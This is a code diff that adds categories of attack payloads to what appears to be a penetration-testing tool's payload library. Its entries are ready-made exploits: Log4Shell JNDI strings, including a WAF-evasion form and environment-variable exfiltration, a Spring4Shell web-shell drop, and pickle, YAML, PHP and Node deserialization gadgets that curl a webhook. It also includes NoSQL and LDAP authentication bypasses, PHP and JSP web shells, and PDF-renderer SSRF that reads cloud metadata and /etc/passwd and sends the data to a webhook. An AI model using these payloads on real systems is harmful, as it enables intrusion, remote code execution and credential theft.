@@ -1224,6 +1224,364 @@ export function getPayloadsData({ webhookUrl = '', xssPayloadUrl = '', webhookHo
           tech: 'Android Manifest XML'
         }
       ]
+    },
+    {
+      category: 'DESER',
+      title: 'Insecure Deserialization & JNDI / Log4j',
+      items: [
+        { 
+          title: 'Java Log4Shell LDAP JNDI Lookup', 
+          code: `\${jndi:ldap://${webhookHost}/a}`, 
+          desc: 'Standard Log4j CVE-2021-44228 JNDI LDAP lookup trigger, initiating outbound connection to listener.',
+          priority: 'HIGH', 
+          era: 'JNDI / Log4j',
+          tech: 'Java / Log4j'
+        },
+        { 
+          title: 'Java Log4Shell RMI JNDI Lookup', 
+          code: `\${jndi:rmi://${webhookHost}/b}`, 
+          desc: 'JNDI lookup over RMI protocol to bypass LDAP-specific egress firewalls.',
+          priority: 'HIGH', 
+          era: 'JNDI / Log4j',
+          tech: 'Java / Log4j'
+        },
+        { 
+          title: 'Java Log4Shell WAF Lowercase Evasion', 
+          code: `\${\${lower:j\}ndi:\${lower:l\}dap://${webhookHost}/c}`, 
+          desc: 'Nested variable evaluation bypassing static string pattern filters and WAF rules.',
+          priority: 'HIGH', 
+          era: 'WAF Bypass',
+          tech: 'Java / Log4j'
+        },
+        { 
+          title: 'Java Log4Shell Environment Variable Exfiltration', 
+          code: `\${jndi:ldap://${webhookHost}/\${env:USER}}`, 
+          desc: 'Exfiltrates server username or AWS credentials inside the JNDI lookup path.',
+          priority: 'HIGH', 
+          era: 'Exfiltration',
+          tech: 'Java / Log4j'
+        },
+        { 
+          title: 'Spring4Shell (CVE-2022-22965) ClassLoader Valve Exploit', 
+          code: `class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`, 
+          desc: 'Spring Framework ClassLoader binding flaw overwriting Tomcat AccessLogValve to drop a persistent JSP web shell.',
+          priority: 'HIGH', 
+          era: 'Spring4Shell',
+          tech: 'Java Spring / Tomcat'
+        },
+        { 
+          title: 'Java ysoserial JRMPListener Pingback', 
+          code: `java -jar ysoserial.jar JRMPClient ${webhookHost}:1099`, 
+          desc: 'Generates Java serialized payload that forces JVM to connect back to remote JRMP/RMI listener.',
+          priority: 'HIGH', 
+          era: 'Gadget Chain',
+          tech: 'Java / ysoserial'
+        },
+        { 
+          title: 'Fastjson Autotype Deserialization (CVE-2017-18349)', 
+          code: `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://${webhookHost}/a","autoCommit":true}`, 
+          desc: 'Fastjson unvalidated autotype deserialization gadget triggering remote JNDI LDAP lookup.',
+          priority: 'HIGH', 
+          era: 'Fastjson RCE',
+          tech: 'Java / Fastjson'
+        },
+        { 
+          title: 'Jackson Polymorphic Deserialization (CVE-2017-7525)', 
+          code: `["org.springframework.context.support.ClassPathXmlApplicationContext", "${webhookUrl}/evil.xml"]`, 
+          desc: 'Polymorphic type handling gadget loading remote Spring XML application context.',
+          priority: 'HIGH', 
+          era: 'Jackson Deser',
+          tech: 'Java / Jackson'
+        },
+        { 
+          title: 'Python Pickle Unsafe Deserialization RCE', 
+          code: `cos\\nsystem\\n(S'curl ${webhookUrl}/?py=pickle'\\ntR.`, 
+          desc: 'Raw Python pickle bytecode opcode invoking os.system upon unpickling.',
+          priority: 'HIGH', 
+          era: 'Deserialization',
+          tech: 'Python / Pickle'
+        },
+        { 
+          title: 'Python PyYAML Unsafe Object Load RCE', 
+          code: `!!python/object/apply:subprocess.Popen [["curl", "${webhookUrl}/?py=yaml"]]`, 
+          desc: 'PyYAML unsafe tag instantiation executing subprocess commands during yaml.load().',
+          priority: 'HIGH', 
+          era: 'Deserialization',
+          tech: 'Python / PyYAML'
+        },
+        { 
+          title: 'PHP Object Injection POP Chain', 
+          code: `O:8:"Exploit":1:{s:4:"cmd";s:38:"curl ${webhookUrl}/?php=unserialize";}`, 
+          desc: 'Serialized PHP object triggering magic methods (__destruct/__wakeup) to execute commands.',
+          priority: 'HIGH', 
+          era: 'POP Chain',
+          tech: 'PHP Object'
+        },
+        { 
+          title: 'Node.js node-serialize IIFE Code Injection', 
+          code: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').execSync('curl ${webhookUrl}/?node=serialize');}()"}`, 
+          desc: 'Exploits node-serialize unescape flaw using Immediately Invoked Function Expressions (IIFE).',
+          priority: 'HIGH', 
+          era: 'Deserialization',
+          tech: 'Node.js'
+        },
+        { 
+          title: '.NET ViewState Deserialization Command Probe', 
+          code: `ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "curl ${webhookUrl}"`, 
+          desc: 'Generates signed or encrypted ASP.NET ViewState payload when machineKey is known or default.',
+          priority: 'HIGH', 
+          era: 'Deserialization',
+          tech: 'ASP.NET / .NET'
+        }
+      ]
+    },
+    {
+      category: 'NOSQL',
+      title: 'NoSQL Injection (MongoDB & CouchDB)',
+      items: [
+        { 
+          title: 'MongoDB Authentication Bypass Query', 
+          code: `{"username": {"$ne": null}, "password": {"$ne": null}}`, 
+          desc: 'Injected into JSON authentication endpoints; matches any user record where username/password is not null.',
+          priority: 'HIGH', 
+          era: 'Auth Bypass',
+          tech: 'MongoDB / Express'
+        },
+        { 
+          title: 'MongoDB Greater-Than Filter Parameter Injection', 
+          code: `username[$gt]=&password[$gt]=`, 
+          desc: 'Injected via query string or URL-encoded form body to pass Mongo comparison operator through query parser.',
+          priority: 'HIGH', 
+          era: 'Auth Bypass',
+          tech: 'MongoDB / Express'
+        },
+        { 
+          title: 'MongoDB Regex Password Character Extraction', 
+          code: `{"password": {"$regex": "^a.*"}}`, 
+          desc: 'Iterates through characters using regular expression anchors to dump passwords character-by-character.',
+          priority: 'HIGH', 
+          era: 'Blind Extraction',
+          tech: 'MongoDB'
+        },
+        { 
+          title: 'MongoDB $where Clause JavaScript Callback', 
+          code: `{"$where": "this.user == 'admin' && (function(){ fetch('${webhookUrl}/?u='+this.password) })()"}`, 
+          desc: 'Executes arbitrary server-side JavaScript inside MongoDB $where clause to exfiltrate database contents.',
+          priority: 'HIGH', 
+          era: 'Server JS Exec',
+          tech: 'MongoDB'
+        },
+        { 
+          title: 'MongoDB Blind Time-Based JavaScript Sleep', 
+          code: `{"$where": "sleep(5000)"}`, 
+          desc: 'Forces MongoDB daemon to pause for 5 seconds to verify blind NoSQL injection.',
+          priority: 'HIGH', 
+          era: 'Blind / Time-Based',
+          tech: 'MongoDB'
+        },
+        { 
+          title: 'MongoDB $lookup Pipeline Projection Extraction', 
+          code: `[{"$lookup": {"from": "users", "pipeline": [{"$match": {"role": "admin"}}], "as": "admins"}}]`, 
+          desc: 'Aggregates hidden collections across collections through unauthenticated NoSQL aggregation pipelines.',
+          priority: 'HIGH', 
+          era: 'Aggregation',
+          tech: 'MongoDB'
+        },
+        { 
+          title: 'CouchDB Design Document Escalation', 
+          code: `{"_id": "_design/auth", "language": "javascript", "views": {"all": {"map": "function(doc){emit(doc._id, doc)}"}}`, 
+          desc: 'Injects custom CouchDB design view to dump unindexed sensitive collections.',
+          priority: 'MEDIUM', 
+          era: 'Data Extraction',
+          tech: 'CouchDB'
+        }
+      ]
+    },
+    {
+      category: 'UPLOAD',
+      title: 'File Upload Polyglots & Web Shells',
+      items: [
+        { 
+          title: 'PHP GIF89a Magic Byte Polyglot Web Shell', 
+          code: `GIF89a;<?php system($_GET['c']); ?>`, 
+          desc: 'Valid GIF header bypassing MIME type detection and magic byte verification while remaining executable PHP.',
+          priority: 'HIGH', 
+          era: 'Polyglot Shell',
+          tech: 'PHP / Image'
+        },
+        { 
+          title: 'Apache .htaccess MIME Type Overriding', 
+          code: 'AddType application/x-httpd-php .png\\nphp_flag engine on', 
+          desc: 'Uploaded as .htaccess in writeable folders to force Apache to execute .png images as PHP code.',
+          priority: 'HIGH', 
+          era: 'Server Config',
+          tech: 'Apache HTTPD'
+        },
+        { 
+          title: 'IIS web.config ASP.NET Handler Override', 
+          code: '<configuration><system.webServer><handlers><add name="asp" path="*.png" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" resourceType="Unspecified"/></handlers></system.webServer></configuration>', 
+          desc: 'Uploaded as web.config to configure IIS to map image extensions to the active script processor.',
+          priority: 'HIGH', 
+          era: 'Server Config',
+          tech: 'Microsoft IIS'
+        },
+        { 
+          title: 'Double Extension Bypass (.php.jpg)', 
+          code: 'shell.php.jpg', 
+          desc: 'Bypasses file upload filters checking only the final extension on servers configured with multi-view handlers.',
+          priority: 'HIGH', 
+          era: 'WAF Bypass',
+          tech: 'Apache / PHP'
+        },
+        { 
+          title: 'IIS Semicolon Filename Truncation Bypass', 
+          code: 'shell.asp;.jpg', 
+          desc: 'Exploits IIS legacy filename parsing where everything after semicolon is ignored during execution.',
+          priority: 'HIGH', 
+          era: 'IIS Bypass',
+          tech: 'Microsoft IIS'
+        },
+        { 
+          title: 'Alternate PHP File Extensions (.phtml / .phar)', 
+          code: 'shell.phtml', 
+          desc: 'Uses alternate PHP extensions (.phtml, .php5, .phar, .PhP) that bypass strict .php blocklists.',
+          priority: 'MEDIUM', 
+          era: 'Extension Bypass',
+          tech: 'PHP Engine'
+        },
+        { 
+          title: 'Zip Slip Path Traversal Archive Shell', 
+          code: 'zip -r evil.zip ../../../../var/www/html/shell.php', 
+          desc: 'Archive file containing files with directory traversal paths; unpacks web shell directly into webroot.',
+          priority: 'HIGH', 
+          era: 'Archive Traversal',
+          tech: 'Zip / Unzip'
+        },
+        { 
+          title: 'SVG with Embedded JavaScript XSS', 
+          code: `<?xml version="1.0" standalone="no"?><svg xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">import('${xssPayloadUrl}')</script></svg>`, 
+          desc: 'Uploads valid SVG vector image containing embedded script that executes whenever image is viewed directly.',
+          priority: 'HIGH', 
+          era: 'Image XSS',
+          tech: 'SVG / XML'
+        },
+        { 
+          title: 'JSP Web Shell One-Liner (.jsp)', 
+          code: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 
+          desc: 'Minimal JSP web shell executing commands via request parameter.',
+          priority: 'HIGH', 
+          era: 'Web Shell RCE',
+          tech: 'Java / JSP'
+        }
+      ]
+    },
+    {
+      category: 'PDF',
+      title: 'PDF Generation & Headless Browser SSRF',
+      items: [
+        { 
+          title: 'Headless Chromium Iframe SSRF', 
+          code: '<iframe src="http://169.254.169.254/latest/meta-data/" width="800px" height="600px"></iframe>', 
+          desc: 'Injected into HTML reports rendered by headless browsers to print cloud metadata into the output PDF.',
+          priority: 'HIGH', 
+          era: 'PDF SSRF',
+          tech: 'Chromium / Puppeteer'
+        },
+        { 
+          title: 'Headless Chromium Local File Read Iframe', 
+          code: '<iframe src="file:///etc/passwd" width="800px" height="600px"></iframe>', 
+          desc: 'Renders local server file contents directly into the generated PDF document pages.',
+          priority: 'HIGH', 
+          era: 'Local File Read',
+          tech: 'Chromium / Puppeteer'
+        },
+        { 
+          title: 'Headless Chromium XHR Exfiltration to Webhook', 
+          code: `<script>var x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();fetch('${webhookUrl}/?pdf='+btoa(x.responseText))</script>`, 
+          desc: 'Uses synchronous XHR to read file:///etc/passwd and transmits base64 data to your webhook receiver.',
+          priority: 'HIGH', 
+          era: 'OOB Callback',
+          tech: 'Headless Chrome'
+        },
+        { 
+          title: 'wkhtmltopdf Meta Refresh SSRF', 
+          code: '<meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">', 
+          desc: 'Forces wkhtmltopdf to follow HTTP meta refresh redirect to internal metadata addresses.',
+          priority: 'HIGH', 
+          era: 'PDF SSRF',
+          tech: 'wkhtmltopdf'
+        },
+        { 
+          title: 'Dompdf Remote Font PHP Code Execution', 
+          code: `@font-face { font-family:'Exploit'; src:url('${webhookUrl}/font.php'); }`, 
+          desc: 'Exploits Dompdf font caching vulnerability to download and cache remote PHP script in web-accessible font directory.',
+          priority: 'HIGH', 
+          era: 'RCE Exploit',
+          tech: 'Dompdf / PHP'
+        },
+        { 
+          title: 'WeasyPrint Attachment File Disclosure', 
+          code: '<link rel="attachment" href="file:///etc/passwd">', 
+          desc: 'Embeds /etc/passwd as a downloadable PDF file attachment in WeasyPrint generated documents.',
+          priority: 'HIGH', 
+          era: 'File Extraction',
+          tech: 'WeasyPrint'
+        }
+      ]
+    },
+    {
+      category: 'LDAP',
+      title: 'LDAP Injection & Active Directory OOB',
+      items: [
+        { 
+          title: 'LDAP Authentication Always-True Bypass', 
+          code: '*)(&', 
+          desc: 'Injected into LDAP login queries to terminate existing filter and evaluate subsequent condition as true.',
+          priority: 'HIGH', 
+          era: 'Auth Bypass',
+          tech: 'LDAP / Active Directory'
+        },
+        { 
+          title: 'LDAP Wildcard Username Authentication', 
+          code: '*', 
+          desc: 'Bypasses username filters by matching the first available record in the directory tree.',
+          priority: 'MEDIUM', 
+          era: 'Auth Bypass',
+          tech: 'LDAP'
+        },
+        { 
+          title: 'Active Directory SMB Hash Capture via UNC', 
+          code: `\\\\${webhookHost}\\share`, 
+          desc: 'Injected into directory search paths to force Windows domain controller to send NetNTLM hashes.',
+          priority: 'HIGH', 
+          era: 'OOB Callback',
+          tech: 'Active Directory / SMB'
+        },
+        { 
+          title: 'LDAP Blind Attribute Character Extraction', 
+          code: '*)(uid=*))(|(uid=*', 
+          desc: 'Enumerates directory attributes character by character using boolean logic verification.',
+          priority: 'HIGH', 
+          era: 'Blind Extraction',
+          tech: 'LDAP'
+        },
+        { 
+          title: 'Active Directory DNS Pingback Probe', 
+          code: `${webhookHost}`, 
+          desc: 'Forces LDAP referral or Kerberos domain resolution to send DNS query to listener.',
+          priority: 'MEDIUM', 
+          era: 'DNS Callback',
+          tech: 'Active Directory'
+        },
+        { 
+          title: 'LDAP Filter Breakout With AND Operator', 
+          code: 'admin*)(|(password=*))', 
+          desc: 'Injected into user authentication searches to bypass password verification.',
+          priority: 'HIGH', 
+          era: 'Auth Bypass',
+          tech: 'LDAP'
+        }
+      ]
     }
   ];
 }
